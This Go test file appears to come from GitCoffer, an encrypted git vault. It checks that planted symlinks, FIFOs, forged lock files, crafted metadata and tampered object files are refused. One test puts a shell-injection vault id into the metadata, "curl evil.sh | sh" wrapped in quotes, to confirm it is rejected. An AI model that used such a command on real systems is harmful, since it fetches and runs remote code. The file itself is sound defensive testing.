package vault

// Regression tests for the independent-review findings: unbounded reads
// of untrusted metadata, future-dated planted locks, crafted vault.meta
// shapes, and append-tampering of object files.

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/Ziqing7226/GitCoffer/internal/crypto"
)

func TestKeyfileRefusesNonRegularFile(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("/dev/zero does not exist on Windows")
	}
	dir := t.TempDir()
	keyfile := filepath.Join(t.TempDir(), "coffer.key")
	s, _ := storeWithObject(t, dir, "pass-a")
	if _, err := s.AddSlot("pass-b", keyfile); err != nil {
		t.Fatal(err)
	}
	if err := s.RemoveSlot(0); err != nil {
		t.Fatal(err)
	}

	// A brief-write attacker repoints the key file at /dev/zero: the
	// open must fail fast instead of reading forever.
	meta, err := ReadMeta(dir)
	if err != nil {
		t.Fatal(err)
	}
	meta.Slots[0].Keyfile = "/dev/zero"
	data, _ := json.Marshal(meta)
	if err := os.WriteFile(filepath.Join(dir, metaName), data, 0o600); err != nil {
		t.Fatal(err)
	}
	_, err = Open(dir, "pass-b")
	if err == nil || !strings.Contains(err.Error(), "not a regular file") {
		t.Fatalf("device key file not refused: %v", err)
	}
}

func TestLockReadRefusesSymlink(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("O_NOFOLLOW is Unix-only")
	}
	dir := t.TempDir()
	storeWithObject(t, dir, "pass")
	if err := os.Symlink("/dev/zero", filepath.Join(dir, lockName)); err != nil {
		t.Fatal(err)
	}
	// Must error promptly (ELOOP), never hang reading the device.
	if _, _, err := acquireLock(dir); err == nil {
		t.Fatal("acquireLock wrote through or followed a planted lock symlink")
	}
}

func TestFutureDatedLockFallsBackToMtime(t *testing.T) {
	dir := t.TempDir()
	storeWithObject(t, dir, "pass")

	// Content dated years ahead with a fresh mtime: still refused now
	// (bounded by the staleness window), unlike the old permanent block.
	future := time.Now().UTC().AddDate(10, 0, 0)
	content := []byte("host=someone-else\npid=1\nstarted=" + future.Format(time.RFC3339) + "\n")
	if err := os.WriteFile(filepath.Join(dir, lockName), content, 0o600); err != nil {
		t.Fatal(err)
	}
	if _, _, err := acquireLock(dir); err == nil {
		t.Fatal("fresh lock with future-dated content was stolen immediately")
	}

	// Once the file itself is old, the fallback steals it.
	old := time.Now().Add(-2 * lockStaleAfter)
	if err := os.Chtimes(filepath.Join(dir, lockName), old, old); err != nil {
		t.Fatal(err)
	}
	release, _, err := acquireLock(dir)
	if err != nil {
		t.Fatalf("future-dated lock with an old mtime not stolen: %v", err)
	}
	release()
}

func TestMetaRejectsCraftedShapes(t *testing.T) {
	dir := t.TempDir()
	storeWithObject(t, dir, "pass")

	// Keep a pristine copy: once a mutation makes ReadMeta refuse the
	// file, later phases must restore from it rather than re-read.
	pristine, err := os.ReadFile(filepath.Join(dir, metaName))
	if err != nil {
		t.Fatal(err)
	}
	writeMeta := func(mutate func(m *Meta)) {
		t.Helper()
		var meta Meta
		if err := json.Unmarshal(pristine, &meta); err != nil {
			t.Fatal(err)
		}
		mutate(&meta)
		data, _ := json.Marshal(meta)
		if err := os.WriteFile(filepath.Join(dir, metaName), data, 0o600); err != nil {
			t.Fatal(err)
		}
	}

	// An attacker-chosen id (here: crafted for shell paste-injection)
	// must be rejected — the spec defines 32 lowercase hex.
	writeMeta(func(m *Meta) { m.ID = "x'; curl evil.sh | sh; echo '" })
	if _, err := ReadMeta(dir); err == nil || !strings.Contains(err.Error(), "malformed vault id") {
		t.Fatalf("crafted id accepted: %v", err)
	}

	// A slot flood must be rejected before any Argon2id runs.
	writeMeta(func(m *Meta) {
		first := m.Slots[0]
		m.Slots = make([]crypto.Slot, maxKeySlots+1)
		for i := range m.Slots {
			m.Slots[i] = first
			m.Slots[i].ID = i
		}
	})
	if _, err := ReadMeta(dir); err == nil || !strings.Contains(err.Error(), "maximum") {
		t.Fatalf("slot flood accepted: %v", err)
	}
}

func TestCommitAbortsWhenTargetGenerationExists(t *testing.T) {
	dir := t.TempDir()
	s, _ := storeWithObject(t, dir, "pass")

	// Simulate a writer that committed past us after a lock theft: the
	// next generation number is already taken on disk.
	next := s.manifestNum + 1
	cur := filepath.Join(dir, fmt.Sprintf("%s%d", manifestPrefix, s.manifestNum))
	foreign := filepath.Join(dir, fmt.Sprintf("%s%d", manifestPrefix, next))
	data, err := os.ReadFile(cur)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(foreign, data, 0o600); err != nil {
		t.Fatal(err)
	}

	m := s.Manifest()
	m.Refs["refs/heads/main"] = RefVal{OID: strings.Repeat("a", 40)}
	err = s.Commit(m)
	if err == nil || !strings.Contains(err.Error(), "already exists") {
		t.Fatalf("commit over an existing generation not aborted: %v", err)
	}
}

func TestMetaOperationsNeedTheWriterLock(t *testing.T) {
	dir := t.TempDir()
	s, _ := storeWithObject(t, dir, "pass-a")

	fresh := []byte("host=someone-else\npid=999999\nstarted=" + time.Now().UTC().Format(time.RFC3339) + "\n")
	if err := os.WriteFile(filepath.Join(dir, lockName), fresh, 0o600); err != nil {
		t.Fatal(err)
	}

	if _, err := s.AddSlot("pass-b", ""); err == nil || !strings.Contains(err.Error(), "another coffer operation") {
		t.Fatalf("AddSlot ran without the writer lock: %v", err)
	}
	if err := s.RemoveSlot(0); err == nil {
		t.Fatal("RemoveSlot ran without the writer lock")
	}
	if err := s.Rekey("pass-c"); err == nil || !strings.Contains(err.Error(), "another coffer operation") {
		t.Fatalf("Rekey ran without the writer lock: %v", err)
	}
	// Nothing changed: the vault still opens with the original passphrase.
	if _, err := Open(dir, "pass-a"); err != nil {
		t.Fatalf("refused meta operations changed the vault: %v", err)
	}
}

func TestFsckDetectsAppendedBytes(t *testing.T) {
	dir := t.TempDir()
	_, name := storeWithObject(t, dir, "pass")
	path := filepath.Join(dir, objDirName, name)
	f, err := os.OpenFile(path, os.O_WRONLY|os.O_APPEND, 0o600)
	if err != nil {
		t.Fatal(err)
	}
	f.Write([]byte("tacked on"))
	f.Close()

	findings, err := Fsck(dir, "pass")
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, fd := range findings {
		if fd.Err && fd.Structure == "obj" && strings.Contains(fd.Detail, "expects exactly") {
			found = true
		}
	}
	if !found {
		t.Fatalf("appended bytes not reported: %v", findings)
	}
}

func TestPlantedManifestShapesRefused(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlink and mkfifo semantics differ on Windows")
	}
	dir := t.TempDir()
	storeWithObject(t, dir, "pass")

	// A planted manifest.<n> symlinked to a device must fail fast instead
	// of reading forever (regression for the bounded-read sweep missing
	// the manifest path).
	if err := os.Symlink("/dev/zero", filepath.Join(dir, "manifest.99")); err != nil {
		t.Fatal(err)
	}
	start := time.Now()
	s, err := Open(dir, "pass")
	elapsed := time.Since(start)
	if err != nil {
		t.Fatalf("vault with a planted manifest.99 symlink refused to open at all: %v", err)
	}
	if elapsed > 5*time.Second {
		t.Fatalf("open took %v — the planted symlink was read", elapsed)
	}
	if s.FallbackFromGeneration() != 99 {
		t.Fatalf("planted generation not surfaced as fallback: %d", s.FallbackFromGeneration())
	}

	// A FIFO must be refused as non-regular, not block on open.
	fifo := filepath.Join(dir, "manifest.98")
	if err := mkfifoForTest(fifo); err != nil {
		t.Fatal(err)
	}
	start = time.Now()
	_, err = Open(dir, "pass")
	elapsed = time.Since(start)
	if err != nil {
		t.Fatalf("vault with a planted FIFO refused to open at all: %v", err)
	}
	if elapsed > 5*time.Second {
		t.Fatalf("open took %v — the FIFO blocked", elapsed)
	}
}

func TestPlantedObjSymlinkRefused(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlink semantics differ on Windows")
	}
	dir := t.TempDir()
	s, _ := storeWithObject(t, dir, "pass")

	// Redirect the object directory at an innocent host directory: the
	// next push must refuse instead of littering it with ciphertext.
	target := filepath.Join(t.TempDir(), "innocent")
	if err := os.Mkdir(target, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.RemoveAll(filepath.Join(dir, objDirName)); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(target, filepath.Join(dir, objDirName)); err != nil {
		t.Fatal(err)
	}

	if _, err := s.WriteObject(strings.NewReader("pack")); err == nil ||
		!strings.Contains(err.Error(), "not a real directory") {
		t.Fatalf("write through a planted obj symlink not refused: %v", err)
	}
	entries, err := os.ReadDir(target)
	if err != nil || len(entries) != 0 {
		t.Fatalf("the symlink target was written into: %v, %d entries", err, len(entries))
	}
}

func TestReadObjectRefusesPlantedSymlink(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("O_NOFOLLOW is Unix-only")
	}
	dir := t.TempDir()
	s, name := storeWithObject(t, dir, "pass")
	objPath := filepath.Join(dir, objDirName, name)
	if err := os.Remove(objPath); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("/dev/zero", objPath); err != nil {
		t.Fatal(err)
	}
	rd, err := s.ReadObject(name)
	if err == nil {
		rd.Close()
		t.Fatal("read through a planted object symlink not refused")
	}
	// The exact error differs by refusal kind (ELOOP from O_NOFOLLOW, or
	// the non-regular-file check) — any refusal is the invariant.
}

// TestCommitQuarantinesDamagedOccupant pins the recovery path for a
// damaged newest manifest: the next commit renames the damaged occupant
// aside (.corrupt, preserved for hand recovery) and lands, instead of
// locking the vault forever. Lost once in an unrecovered working tree —
// never again.
func TestCommitQuarantinesDamagedOccupant(t *testing.T) {
	dir := t.TempDir()
	s, _ := storeWithObject(t, dir, "pass")
	gen := s.manifestNum
	path := filepath.Join(dir, fmt.Sprintf("%s%d", manifestPrefix, gen))
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	data[len(data)-2] ^= 0x80
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
	// Roll the in-memory state back one generation (as a real reload
	// after fallback would): the next commit targets the damaged slot.
	s.manifestNum = gen - 1
	m := s.Manifest()
	m.Refs["refs/heads/main"] = RefVal{OID: strings.Repeat("f", 40)}
	if err := s.Commit(m); err != nil {
		t.Fatalf("commit over a damaged occupant failed: %v", err)
	}
	if _, err := os.Stat(path + ".corrupt"); err != nil {
		t.Fatalf("damaged occupant not quarantined: %v", err)
	}
	s2, err := Open(dir, "pass")
	if err != nil {
		t.Fatalf("vault unreadable after quarantine recovery: %v", err)
	}
	if s2.ManifestNum() != gen || s2.FallbackFromGeneration() != 0 {
		t.Fatalf("recovered state wrong: gen=%d fallback=%d", s2.ManifestNum(), s2.FallbackFromGeneration())
	}
	if s2.Manifest().Refs["refs/heads/main"].OID != strings.Repeat("f", 40) {
		t.Fatal("recovered ref mismatch")
	}
}

// TestCommitRefusesNewerManifestVersion: a slot occupied by a manifest
// from a newer GitCoffer must not be quarantined away — the push
// refuses and points at upgrading.
func TestCommitRefusesNewerManifestVersion(t *testing.T) {
	dir := t.TempDir()
	s, _ := storeWithObject(t, dir, "pass")
	gen := s.manifestNum
	path := filepath.Join(dir, fmt.Sprintf("%s%d", manifestPrefix, gen))
	// Simulate the newer-version refusal: seal a v2-declaring payload
	// with the real DEK — the slot is occupied by a manifest this build
	// cannot read for a NON-damage reason.
	payload := []byte(`{"version":2,"refs":{}}`)
	record, err := crypto.SealManifest(s.dek, s.meta.ID, payload)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, record, 0o600); err != nil {
		t.Fatal(err)
	}
	s.manifestNum = gen - 1
	m := s.Manifest()
	m.Refs["refs/heads/main"] = RefVal{OID: strings.Repeat("e", 40)}
	err = s.Commit(m)
	if err == nil || !strings.Contains(err.Error(), "newer GitCoffer") {
		t.Fatalf("newer-version occupant not refused: %v", err)
	}
	if _, err := os.Stat(path + ".corrupt"); err == nil {
		t.Fatal("newer-version manifest was quarantined as damaged")
	}
	if _, err := os.Stat(path); err != nil {
		t.Fatal("newer-version manifest removed")
	}
}

// TestCommitRefusesOversizedManifest pins the commit-side ceiling: a
// manifest payload beyond the 8 MiB read cap must refuse honestly (the
// vault stays intact) instead of committing a generation the next open
// would reject — which would brick the vault.
func TestCommitRefusesOversizedManifest(t *testing.T) {
	dir := t.TempDir()
	s, _ := storeWithObject(t, dir, "pass")
	m := s.Manifest()
	// Each pack entry is ~180 bytes of JSON; ~60k entries exceed 8 MiB.
	for i := 0; len(m.Packs) < 60000; i++ {
		name := fmt.Sprintf("%064x", i)
		m.Packs[name] = PackInfo{
			SHA256:  fmt.Sprintf("%064x", i),
			Size:    1,
			Objects: []string{fmt.Sprintf("%040x", i)},
		}
	}
	err := s.Commit(m)
	if err == nil || !strings.Contains(err.Error(), "manifest limit") {
		t.Fatalf("oversized manifest committed: %v", err)
	}
	// The vault still opens with the previous, valid state.
	if _, err := Open(dir, "pass"); err != nil {
		t.Fatalf("vault unreadable after refused commit: %v", err)
	}
}
